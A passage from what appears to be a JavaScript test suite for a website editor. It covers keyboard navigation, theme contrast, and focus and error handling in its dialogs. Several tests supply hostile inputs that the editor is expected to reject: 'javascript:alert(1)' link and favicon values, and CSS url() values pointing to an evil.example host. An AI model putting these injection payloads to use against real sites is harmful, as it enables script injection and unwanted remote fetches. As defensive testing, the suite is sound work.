      const scrolled = scroller.scrollTop === 0;
      about.select.getBoundingClientRect = () => rect(300, 330);
      const moveEnd = {
        key: "End",
        target: home.select,
        currentTarget: home.select,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      themes.onThemeKeyDown(moveEnd);
      const endFocused = doc.activeElement === about.select;
      const endStop =
        about.select.tabIndex === 0 && about.preview.tabIndex === -1;
      const endScrolled = scroller.scrollTop === 292;
      const boundary = {
        key: "ArrowDown",
        target: about.select,
        currentTarget: about.select,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      themes.onThemeKeyDown(boundary);
      const nested = {
        key: "ArrowDown",
        target: doc.createElement("span"),
        currentTarget: home.preview,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      themes.onThemeKeyDown(nested);
      const source = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "ThemesTab.tsx"),
        "utf8",
      );
      const keyboard = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "themeKeyboard.ts"),
        "utf8",
      );
      const help = squashText(
        fs.readFileSync(
          path.join(ROOT, "src", "renderer", "HelpModal.tsx"),
          "utf8",
        ),
      );
      record(
        "starter themes move with the arrow keys without previewing or selecting",
        down === about.preview &&
          right === home.select &&
          downSelect === quote.select &&
          left === about.preview &&
          up === quote.select &&
          toStart === home.preview &&
          end === about.preview &&
          edge === null &&
          ignore === null &&
          kept &&
          kept.id === "about" &&
          kept.kind === "select" &&
          missing &&
          missing.id === "home" &&
          missing.kind === "preview" &&
          empty === null &&
          move.defaultPrevented === true &&
          focused &&
          oneStop &&
          scrolled &&
          moveEnd.defaultPrevented === true &&
          endFocused &&
          endStop &&
          endScrolled &&
          previews === 0 &&
          selects === 0 &&
          boundary.defaultPrevented === true &&
          nested.defaultPrevented === false &&
          source.split("onKeyDown={rememberStop}").length - 1 === 2 &&
          source.includes("themeStop(") &&
          source.includes('data-theme-action="preview"') &&
          source.includes('data-theme-action="select"') &&
          !keyboard.includes(".click(") &&
          help.includes(
            "Move between starter themes and their preview and select buttons when that list is focused",
          ),
        `down=${down === about.preview} right=${right === home.select} focused=${focused} oneStop=${oneStop} endFocused=${endFocused} scroll=${scroller.scrollTop} previews=${previews} selects=${selects} boundary=${boundary.defaultPrevented} nested=${nested.defaultPrevented}`,
      );
      scroller.remove();
    } catch (error) {
      record(
        "starter themes move with the arrow keys without previewing or selecting",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // The start-screen chrome rule paints every theme card with the same
  // border, so a selected theme looked the same as the others.
  {
    try {
      const css = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "styles.css"),
        "utf8",
      );
      const ruleBody = (selector) => {
        let from = css.length;
        while (from > 0) {
          const at = css.lastIndexOf(`${selector} {`, from);
          if (at < 0) return "";
          const lineStart = css.lastIndexOf("\n", at - 1);
          const prefix = css.slice(lineStart + 1, at).trim();
          if (prefix === "") {
            const open = at + selector.length + 2;
            const close = css.indexOf("\n}", open);
            return close < 0 ? "" : css.slice(open, close);
          }
          from = at - 1;
        }
        return "";
      };
      const tokensIn = (blockRe) => {
        const block = css.match(blockRe)?.[0] ?? "";
        const tokens = {};
        const declRe = /--([a-z0-9-]+)\s*:\s*([^;]+);/g;
        let decl;
        while ((decl = declRe.exec(block))) tokens[decl[1]] = decl[2].trim();
        return tokens;
      };
      const hexToRgb = (value) => {
        const match = /^#([0-9a-f]{6})$/i.exec(value ?? "");
        if (!match) return null;
        const n = parseInt(match[1], 16);
        return [(n >> 16) & 255, (n >> 8) & 255, n & 255];
      };
      const channel = (v) => {
        const c = v / 255;
        return c <= 0.04045 ? c / 12.92 : ((c + 0.055) / 1.055) ** 2.4;
      };
      const luminance = (rgb) =>
        0.2126 * channel(rgb[0]) +
        0.7152 * channel(rgb[1]) +
        0.0722 * channel(rgb[2]);
      const contrast = (fg, bg) => {
        const a = luminance(fg);
        const b = luminance(bg);
        return (Math.max(a, b) + 0.05) / (Math.min(a, b) + 0.05);
      };
      const mix = (accent, panel, percent) =>
        accent.map((value, index) =>
          Math.round(
            value * (percent / 100) + panel[index] * (1 - percent / 100),
          ),
        );
      const dark = ruleBody("#view-start .theme-card.selected");
      const light = ruleBody(
        '[data-theme="light"] #view-start .theme-card.selected',
      );
      const system = ruleBody(
        '[data-theme="system"] #view-start .theme-card.selected',
      );
      const percent = (body) => {
        const match =
          /color-mix\(in srgb, var\(--accent\) (\d+)%, var\(--panel\)\)/.exec(
            body,
          );
        return match ? Number(match[1]) : null;
      };
      const lightTokens = tokensIn(/\[data-theme="light"\]\s*\{[\s\S]*?\}/);
      const systemTokens = tokensIn(
        /@media \(prefers-color-scheme: light\)\s*\{\s*\[data-theme="system"\]\s*\{[\s\S]*?\}/,
      );
      const readable = (tokens, body) => {
        const amount = percent(body);
        const text = hexToRgb(tokens.text);
        const muted = hexToRgb(tokens.muted);
        const accent = hexToRgb(tokens.accent);
        const panel = hexToRgb(tokens.panel);
        if (
          amount == null ||
          !text ||
          !muted ||
          !accent ||
          !panel ||
          amount > 40
        ) {
          return false;
        }
        const surface = mix(accent, panel, amount);
        return (
          contrast(text, surface) >= 4.5 && contrast(muted, surface) >= 4.5
        );
      };
      record(
        "selected starter theme stays visible on the start screen",
        dark.includes("border-color: var(--accent)") &&
          !/\bbackground\s*:/.test(dark) &&
          light.includes("border-color: var(--accent)") &&
          system.includes("border-color: var(--accent)") &&
          readable(lightTokens, light) &&
          readable(systemTokens, system),
        `dark=${dark.includes("border-color: var(--accent)")} light=${readable(lightTokens, light)} system=${readable(systemTokens, system)}`,
      );
    } catch (error) {
      record(
        "selected starter theme stays visible on the start screen",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Toggling Match case or Whole words rebuilt the dialog and dropped focus,
  // so the next keypress left the checkbox the user had just changed.
  {
    let body = null;
    let optionsRecorded = false;
    let reportedProblem = false;
    let reportedReplace = false;
    let findActions = [];
    let confirmReplace = false;
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/editorFindReplace.ts")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const find = mod.exports;
      const doc = dom.window.document;
      let searchResult = { ok: true, matches: [], totalMatches: 0 };
      const replaceResult = { ok: false, error: "disk" };
      await find.openFindReplaceModal({
        getState: () => ({
          project: { path: "C:/site", astro: { pagesDir: "src/pages" } },
        }),
        setStatus() {},
        showModalNode(_title, content, actions) {
          body = content;
          findActions = actions;
        },
        closeModal() {},
        registerCleanup() {},
        confirmDestructive: async () => confirmReplace,
        loadPage: async () => {},
        reloadPages: async () => {},
        maybeResolveUnsavedWork: async () => true,
        searchPages: async () => searchResult,
        replaceAllInPages: async () => replaceResult,
      });
      doc.body.append(body);
      const toggle = (selector) => {
        const box = body.querySelector(selector);
        box.focus();
        box.checked = !box.checked;
        box.dispatchEvent(new dom.window.Event("change", { bubbles: true }));
        const active = doc.activeElement;
        return (
          !box.isConnected &&
          active instanceof dom.window.HTMLInputElement &&
          active.classList.contains(selector.slice(1)) &&
          active.checked === true
        );
      };
      const caseKept = toggle(".find-replace-case");
      const wholeKept = toggle(".find-replace-whole");
      optionsRecorded = true;
      record(
        "find options keep focus when the result list is cleared",
        caseKept && wholeKept,
        `case=${caseKept} whole=${wholeKept} active=${doc.activeElement && doc.activeElement.className}`,
      );
      const findInput = () => body.querySelector(".find-replace input");
      const typeFind = (value) => {
        const input = findInput();
        input.focus();
        input.value = value;
        input.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
        return findInput();
      };
      const pressEnter = (input) => {
        input.dispatchEvent(
          new dom.window.KeyboardEvent("keydown", {
            key: "Enter",
            bubbles: true,
          }),
        );
      };
      pressEnter(typeFind("   "));
      const emptyAlert = body.querySelector(".find-replace-error");
      const emptyShown =
        !!emptyAlert &&
        emptyAlert.getAttribute("role") === "alert" &&
        emptyAlert.textContent === "Enter text to find." &&
        doc.activeElement === findInput();
      searchResult = { ok: false, error: "disk" };
      pressEnter(typeFind("hello"));
      await new Promise((resolve) => setTimeout(resolve, 0));
      const failedAlert = body.querySelector(".find-replace-error");
      const failedShown =
        !!failedAlert &&
        failedAlert.textContent === "Search failed: disk" &&
        doc.activeElement === findInput();
      reportedProblem = true;
      record(
        "find reports a problem in the dialog",
        emptyShown && failedShown,
        `empty=${emptyShown} failed=${failedShown} alert=${failedAlert && failedAlert.textContent} active=${doc.activeElement && doc.activeElement.className}`,
      );
      searchResult = {
        ok: true,
        matches: [
          {
            page: "src/pages/index.astro",
            label: "Home",
            count: 1,
            excerpts: ["hello"],
          },
        ],
        totalMatches: 1,
      };
      confirmReplace = true;
      const replaceAll = findActions.find(
        (action) => action.label === "Replace All",
      );
      await replaceAll.onClick();
      const replaceAlert = body.querySelector(".find-replace-error");
      const replaceShown =
        !!replaceAlert &&
        replaceAlert.getAttribute("role") === "alert" &&
        replaceAlert.textContent === "Replace failed: disk" &&
        doc.activeElement === findInput();
      typeFind("hello again");
      const replaceCleared =
        !body.querySelector(".find-replace-error") &&
        doc.activeElement === findInput();
      reportedReplace = true;
      record(
        "replace failure stays in the dialog",
        replaceShown && replaceCleared,
        `shown=${replaceShown} cleared=${replaceCleared} alert=${replaceAlert && replaceAlert.textContent} active=${doc.activeElement && doc.activeElement.className}`,
      );
      body.remove();
    } catch (error) {
      if (body) body.remove();
      if (!optionsRecorded) {
        record(
          "find options keep focus when the result list is cleared",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedProblem) {
        record(
          "find reports a problem in the dialog",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedReplace) {
        record(
          "replace failure stays in the dialog",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
    }
  }

  // Staging a self-referencing accent used to report only on the status bar,
  // which the dialog covers. The warning has to stay in the dialog, on the
  // accent field.
  {
    let body = null;
    let reportedDesign = false;
    let reportedBackground = false;
    let reportedFont = false;
    let reportedCta = false;
    let reportedFavicon = false;
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/editorSiteEditor.ts")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        HTMLButtonElement: dom.window.HTMLButtonElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const doc = dom.window.document;
      let actions = [];
      let siteWrites = 0;
      const site = {
        siteUrl: "",
        language: "en",
        faviconPath: "",
        siteName: "My Site",
        shell: {
          siteTitle: "My Site",
          logoText: "",
          announcementText: "",
          announcementVisible: false,
          navCtaLabel: "",
          navCtaHref: "",
          footerHtml: "",
          customHeadHtml: "",
          layoutMode: "managed",
          navItems: [],
        },
        design: {
          accent: "#7c3aed",
          background: "#ffffff",
          foreground: "#111111",
          surface: "#fafafa",
          fontFamily: "system-ui, sans-serif",
          headingFontFamily: "system-ui, sans-serif",
          radius: "12px",
          containerWidth: "960px",
          shadow: "md",
          fontImportUrl: "",
        },
      };
      const editor = mod.exports.createSiteEditorActions({
        getState: () => ({
          project: { path: "C:/site", astro: { pagesDir: "src/pages" } },
          siteDocument: site,
          pendingSiteDocument: null,
        }),
        setStatus() {},
        closeModal() {},
        showModalNode(_title, content, nextActions) {
          body = content;
          actions = nextActions;
        },
        registerCleanup() {},
        modalController: { confirmDestructive: async () => true },
        resolveSiteEditorConflict: async () => true,
        writeSiteDocumentFromRenderer: async () => {
          siteWrites += 1;
        },
        openLinkPicker() {},
        openAssetBrowser() {},
        buildFontImportUrl: () => "",
        googleFontForStack: () => null,
      });
      await editor.openDesignSystemModal();
      doc.body.append(body);
      const accent = body.querySelector(".design-accent");
      accent.focus();
      accent.value = "var(--accent)";
      accent.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const stage = actions.find((action) => action.label === "Stage Design");
      await stage.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const alert = body.querySelector(".design-accent-error");
      const field = body.querySelector(".design-accent");
      const shown =
        !!alert &&
        alert.getAttribute("role") === "alert" &&
        alert.textContent.includes("cannot reference itself") &&
        doc.activeElement === field &&
        field.value === "var(--accent)";
      field.value = "#112233";
      field.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const cleared =
        !body.querySelector(".design-accent-error") &&
        doc.activeElement === field;
      reportedDesign = true;
      record(
        "design accent warning stays in the dialog",
        shown && cleared,
        `shown=${shown} cleared=${cleared} alert=${alert && alert.textContent} active=${doc.activeElement && doc.activeElement.className}`,
      );
      const background = body.querySelector(".design-background");
      background.focus();
      background.value = "url(https://evil.example/x.png)";
      background.dispatchEvent(
        new dom.window.Event("input", { bubbles: true }),
      );
      await stage.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const backgroundAlert = body.querySelector(".design-background-error");
      const backgroundField = body.querySelector(".design-background");
      const backgroundShown =
        !!backgroundAlert &&
        backgroundAlert.getAttribute("role") === "alert" &&
        backgroundAlert.textContent ===
          "That value cannot be used in the site stylesheet." &&
        doc.activeElement === backgroundField &&
        backgroundField.value === "url(https://evil.example/x.png)" &&
        site.design.background === "#ffffff" &&
        siteWrites === 0;
      backgroundField.focus();
      backgroundField.value = "#ffffff";
      backgroundField.dispatchEvent(
        new dom.window.Event("input", { bubbles: true }),
      );
      const backgroundCleared = !body.querySelector(".design-background-error");
      reportedBackground = true;
      record(
        "design background refuses a remote fetch",
        backgroundShown && backgroundCleared,
        `shown=${backgroundShown} cleared=${backgroundCleared} stored=${site.design.background} writes=${siteWrites}`,
      );
      const bodyFontSelect = body.querySelector(".font-control select");
      bodyFontSelect.value = "custom";
      bodyFontSelect.dispatchEvent(
        new dom.window.Event("change", { bubbles: true }),
      );
      await new Promise((resolve) => setTimeout(resolve, 0));
      const bodyFont = body.querySelector(".design-body-font");
      bodyFont.focus();
      bodyFont.value = "url(https://evil.example/font.css)";
      bodyFont.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      await stage.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const fontAlert = body.querySelector(".design-body-font-error");
      const fontField = body.querySelector(".design-body-font");
      const fontShown =
        !!fontAlert &&
        fontAlert.getAttribute("role") === "alert" &&
        fontAlert.textContent ===
          "That value cannot be used in the site stylesheet." &&
        doc.activeElement === fontField &&
        fontField.value === "url(https://evil.example/font.css)" &&
        site.design.fontFamily === "system-ui, sans-serif" &&
        siteWrites === 0;
      fontField.focus();
      fontField.value = "system-ui, sans-serif";
      fontField.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const fontCleared = !body.querySelector(".design-body-font-error");
      reportedFont = true;
      record(
        "design font refuses a remote fetch",
        fontShown && fontCleared,
        `shown=${fontShown} cleared=${fontCleared} stored=${site.design.fontFamily} writes=${siteWrites}`,
      );
      body.remove();
      await editor.openSiteShellModal();
      doc.body.append(body);
      const cta = body.querySelector(".shell-cta-href");
      cta.focus();
      cta.value = "javascript:alert(1)";
      cta.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const stageShell = actions.find(
        (action) => action.label === "Stage Shell",
      );
      await stageShell.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const ctaAlert = body.querySelector(".shell-cta-error");
      const ctaField = body.querySelector(".shell-cta-href");
      const ctaShown =
        !!ctaAlert &&
        ctaAlert.getAttribute("role") === "alert" &&
        ctaAlert.textContent === "That link type is not allowed." &&
        doc.activeElement === ctaField &&
        ctaField.value === "javascript:alert(1)" &&
        site.shell.navCtaHref === "";
      ctaField.focus();
      ctaField.value = "https://example.com";
      ctaField.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const ctaCleared =
        !body.querySelector(".shell-cta-error") &&
        doc.activeElement === ctaField;
      reportedCta = true;
      record(
        "site shell refuses a script call to action",
        ctaShown && ctaCleared,
        `shown=${ctaShown} cleared=${ctaCleared} alert=${ctaAlert && ctaAlert.textContent} stored=${site.shell.navCtaHref}`,
      );
      const favicon = body.querySelector(".shell-favicon");
      favicon.focus();
      favicon.value = "javascript:alert(1)";
      favicon.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      await stageShell.onClick();
      await new Promise((resolve) => setTimeout(resolve, 0));
      const faviconAlert = body.querySelector(".shell-favicon-error");
      const faviconField = body.querySelector(".shell-favicon");
      const faviconShown =
        !!faviconAlert &&
        faviconAlert.getAttribute("role") === "alert" &&
        faviconAlert.textContent === "That link type is not allowed." &&
        doc.activeElement === faviconField &&
        faviconField.value === "javascript:alert(1)" &&
        site.faviconPath === "" &&
        siteWrites === 0;
      faviconField.focus();
      faviconField.value = "/assets/images/favicon.png";
      faviconField.dispatchEvent(
        new dom.window.Event("input", { bubbles: true }),
      );
      const faviconCleared =
        !body.querySelector(".shell-favicon-error") &&
        doc.activeElement === faviconField;
      reportedFavicon = true;
      record(
        "site shell refuses a script favicon",
        faviconShown && faviconCleared,
        `shown=${faviconShown} cleared=${faviconCleared} alert=${faviconAlert && faviconAlert.textContent} stored=${site.faviconPath}`,
      );
      body.remove();
      body = null;
    } catch (error) {
      if (body) body.remove();
      if (!reportedDesign) {
        record(
          "design accent warning stays in the dialog",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedBackground) {
        record(
          "design background refuses a remote fetch",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedFont) {
        record(
          "design font refuses a remote fetch",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedCta) {
        record(
          "site shell refuses a script call to action",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedFavicon) {
        record(
          "site shell refuses a script favicon",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
    }
  }

  // Typing a script address into a link field must not store it. The field
  // keeps what was typed and explains why it cannot be used.
  {
    let host = null;
    let reportedLink = false;
    let reportedEmbed = false;
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        stdin: {
          contents: [
            'import { render } from "solid-js/web";',
            'import { LinkField, TextField } from "./src/renderer/SectionProperties.tsx";',
            "export function mount(container, props) {",
            "  return render(() => LinkField(props), container);",
            "}",
            "export function mountText(container, props) {",
            "  return render(() => TextField(props), container);",
            "}",
          ].join("\n"),
          resolveDir: ROOT,
          sourcefile: "link-field-mount.tsx",
          loader: "tsx",
        },
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        HTMLButtonElement: dom.window.HTMLButtonElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const doc = dom.window.document;
      const committed = [];
      host = doc.createElement("div");
      doc.body.append(host);
      const dispose = mod.exports.mount(host, {
        label: "Link",
        value: "https://example.com",
        onChange(value) {
          committed.push(value);
        },
        onPick() {},
        onFocus() {},
        onBlur() {},
      });
      const input = host.querySelector("input");
      input.focus();
      input.value = "javascript:alert(1)";
      input.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const alert = host.querySelector(".link-field-error");
      const blocked =
        !!alert &&
        alert.getAttribute("role") === "alert" &&
        alert.textContent === "That link type is not allowed." &&
        input.value === "javascript:alert(1)" &&
        doc.activeElement === input &&
        !committed.includes("javascript:alert(1)");
      input.value = "https://ok.example";
      input.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      const allowed =
        committed[committed.length - 1] === "https://ok.example" &&
        !host.querySelector(".link-field-error") &&
        doc.activeElement === input;
      dispose();
      host.remove();
      reportedLink = true;
      record(
        "link field refuses a script address",
        blocked && allowed,
        `blocked=${blocked} allowed=${allowed} committed=${committed.join("|")} alert=${alert && alert.textContent}`,
      );
      const embedCommitted = [];
      host = doc.createElement("div");
      doc.body.append(host);
      const disposeEmbed = mod.exports.mountText(host, {
        label: "Embed URL",
        value: "https://example.com/embed",
        guardUrl: true,
        onChange(value) {
          embedCommitted.push(value);
        },
        onFocus() {},
        onBlur() {},
      });
      const embedInput = host.querySelector("input");
      embedInput.focus();
      embedInput.value = "javascript:alert(1)";
      embedInput.dispatchEvent(
        new dom.window.Event("input", { bubbles: true }),
      );
      const embedAlert = host.querySelector(".text-field-error");
      const embedBlocked =
        !!embedAlert &&
        embedAlert.getAttribute("role") === "alert" &&
        embedAlert.textContent === "That link type is not allowed." &&
        embedInput.value === "javascript:alert(1)" &&
        doc.activeElement === embedInput &&
        !embedCommitted.includes("javascript:alert(1)");
      embedInput.value = "https://videos.example/embed";
      embedInput.dispatchEvent(
        new dom.window.Event("input", { bubbles: true }),
      );
      const embedAllowed =
        embedCommitted[embedCommitted.length - 1] ===
          "https://videos.example/embed" &&
        !host.querySelector(".text-field-error") &&
        doc.activeElement === embedInput;
      disposeEmbed();
      host.remove();
      host = null;
      reportedEmbed = true;
      record(
        "embed address refuses a script url",
        embedBlocked && embedAllowed,
        `blocked=${embedBlocked} allowed=${embedAllowed} committed=${embedCommitted.join("|")}`,
      );
    } catch (error) {
      if (host) host.remove();
      if (!reportedLink) {
        record(
          "link field refuses a script address",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
      if (!reportedEmbed) {
        record(
          "embed address refuses a script url",
          false,
          error instanceof Error ? error.message : String(error),
        );
      }
    }
  }

  // A navigation save failure has to appear in the open dialog. The status
  // bar is underneath the overlay.
  {
    let root = null;
    try {
      const focus = compileRendererHelper("src/renderer/modalFocus.ts");
      const doc = dom.window.document;
      root = doc.createElement("div");
      doc.body.append(root);
      const first = focus.showInlineAlert(
        root,
        "nav-preview-error",
        "Could not save navigation: disk",
      );
      const second = focus.showInlineAlert(
        root,
        "nav-preview-error",
        "Could not save navigation: locked",
      );
      const engine = fs.readFileSync(
        path.join(ROOT, "src", "renderer", "zephusEngine.ts"),
        "utf8",
      );
      const wired =
        engine.includes("showInlineAlert(") &&
        engine.includes('"nav-preview-error"');
      const shown =
        first === second &&
        root.querySelectorAll(".nav-preview-error").length === 1 &&
        second.getAttribute("role") === "alert" &&
        second.textContent === "Could not save navigation: locked" &&
        wired;
      root.remove();
      root = null;
      record(
        "navigation save failure stays in the dialog",
        shown,
        `shown=${shown} text=${second && second.textContent} wired=${wired}`,
      );
    } catch (error) {
      if (root) root.remove();
      record(
        "navigation save failure stays in the dialog",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // A finished search rebuilt the dialog. Focus was on the query, so the
  // first result has to take it. A search started while focus is elsewhere
  // must leave that control alone.
  {
    try {
      const { solidPlugin } = require("esbuild-plugin-solid");
      const out = await esbuild.build({
        entryPoints: [path.join(ROOT, "src/renderer/editorFindReplace.ts")],
        bundle: true,
        write: false,
        format: "cjs",
        platform: "browser",
        target: "es2020",
        plugins: [solidPlugin()],
      });
      const mod = { exports: {} };
      const sandbox = {
        module: mod,
        exports: mod.exports,
        require,
        console,
        window: dom.window,
        document: dom.window.document,
        HTMLElement: dom.window.HTMLElement,
        HTMLInputElement: dom.window.HTMLInputElement,
        HTMLButtonElement: dom.window.HTMLButtonElement,
        Node: dom.window.Node,
        setTimeout: dom.window.setTimeout.bind(dom.window),
        clearTimeout: dom.window.clearTimeout.bind(dom.window),
        queueMicrotask,
        requestAnimationFrame: (callback) => {
          callback(0);
          return 0;
        },
        cancelAnimationFrame() {},
      };
      vm.runInNewContext(out.outputFiles[0].text, sandbox, { timeout: 5000 });
      const find = mod.exports;
      const doc = dom.window.document;
      let body = null;
      let pending = null;
      let opens = 0;
      await find.openFindReplaceModal({
        getState: () => ({
          project: { path: "C:/site", astro: { pagesDir: "src/pages" } },
        }),
        setStatus() {},
        showModalNode(_title, content) {
          body = content;
        },
        closeModal() {},
        registerCleanup() {},
        confirmDestructive: async () => false,
        loadPage: async () => {
          opens += 1;
        },
        reloadPages: async () => {},
        maybeResolveUnsavedWork: async () => true,
        searchPages: () =>
          new Promise((resolve) => {
            pending = resolve;
          }),
        replaceAllInPages: async () => ({
          ok: true,
          replaced: 0,
          pagesChanged: 0,
        }),
      });
      doc.body.append(body);
      const outside = doc.createElement("button");
      outside.type = "button";
      outside.className = "find-outside";
      doc.body.append(outside);
      const typeQuery = () => {
        const input = body.querySelector(".find-replace input");
        input.focus();
        input.value = "hello";
        input.dispatchEvent(new dom.window.Event("input", { bubbles: true }));
      };
      const search = () => {
        const input = body.querySelector(".find-replace input");
        input.focus();
        input.dispatchEvent(
          new dom.window.KeyboardEvent("keydown", {
            key: "Enter",
            bubbles: true,
          }),
        );
      };
      const settle = async () => {
        await new Promise((resolve) => setTimeout(resolve, 0));
      };
      typeQuery();
      search();
      pending({
        ok: true,
        matches: [
          {
            page: "about",
            label: "About",
            count: 1,
            excerpts: ["hello"],
          },
        ],
        totalMatches: 1,
      });
      await settle();
      const onResult =
        doc.activeElement instanceof dom.window.HTMLButtonElement &&
        doc.activeElement.classList.contains("find-replace-page") &&
        opens === 0;
      outside.focus();
      const input = body.querySelector(".find-replace input");
      input.dispatchEvent(
        new dom.window.KeyboardEvent("keydown", {
          key: "Enter",
          bubbles: true,
        }),
      );
      pending({
        ok: true,
        matches: [],
        totalMatches: 0,
      });
      await settle();
      const leftOutside = doc.activeElement === outside;
      outside.remove();
      body.remove();
      record(
        "find results take focus only when the search field was focused",
        onResult && leftOutside,
        `onResult=${onResult} leftOutside=${leftOutside} opens=${opens} active=${doc.activeElement && doc.activeElement.className}`,
      );
    } catch (error) {
      record(
        "find results take focus only when the search field was focused",
        false,
        error instanceof Error ? error.message : String(error),
      );
    }
  }

  // Search lands on the first result. Arrow keys have to move through the
  // other pages without opening one, and each row has to be a 24px target.
  {
    try {
      const results = compileRendererHelper(
        "src/renderer/findResultKeyboard.ts",
      );
      const doc = dom.window.document;
      const scroller = doc.createElement("div");
      scroller.className = "find-replace-results";
      const list = doc.createElement("ul");
      list.className = "find-replace-list";
      const makeButton = (label) => {
        const button = doc.createElement("button");
        button.type = "button";
        button.className = "find-replace-page";
        button.tabIndex = -1;
        button.textContent = label;
        const row = doc.createElement("li");
        row.append(button);
        list.append(row);
        return button;
      };
      const home = makeButton("Home");
      const quote = makeButton('Quo"te');
      const about = makeButton("About");
      home.tabIndex = 0;
      scroller.append(list);
      doc.body.append(scroller);
      const buttons = [home, quote, about];
      const down = results.findResultMoveTarget(buttons, home, "ArrowDown");
      const downAgain = results.findResultMoveTarget(
        buttons,
        quote,
        "ArrowDown",
      );
      const up = results.findResultMoveTarget(buttons, about, "ArrowUp");
      const toStart = results.findResultMoveTarget(buttons, about, "Home");
      const end = results.findResultMoveTarget(buttons, home, "End");
      const edge = results.findResultMoveTarget(buttons, about, "ArrowDown");
      const ignore = results.findResultMoveTarget(buttons, home, "Enter");
      const rect = (top, bottom) => ({
        top,
        bottom,
        left: 0,
        right: 80,
        width: 80,
        height: bottom - top,
        x: 0,
        y: top,
        toJSON() {
          return {};
        },
      });
      scroller.getBoundingClientRect = () => rect(0, 100);
      quote.getBoundingClientRect = () => rect(20, 50);
      let opens = 0;
      quote.addEventListener("click", () => {
        opens += 1;
      });
      const move = {
        key: "ArrowDown",
        target: home,
        currentTarget: home,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      results.onFindResultKeyDown(move);
      const focused = doc.activeElement === quote;
      const oneStop =
        home.tabIndex === -1 && quote.tabIndex === 0 && about.tabIndex === -1;
      const scrolled = scroller.scrollTop === 0;
      about.getBoundingClientRect = () => rect(300, 330);
      const moveEnd = {
        key: "End",
        target: quote,
        currentTarget: quote,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      results.onFindResultKeyDown(moveEnd);
      const endFocused = doc.activeElement === about;
      const endStop = about.tabIndex === 0 && quote.tabIndex === -1;
      const endScrolled = scroller.scrollTop === 292;
      const boundary = {
        key: "ArrowDown",
        target: about,
        currentTarget: about,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      results.onFindResultKeyDown(boundary);
      const nested = {
        key: "ArrowDown",
        target: doc.createElement("span"),
        currentTarget: home,
        preventDefault() {
          this.defaultPrevented = true;
        },
        defaultPrevented: false,
      };
      results.onFindResultKeyDown(nested);
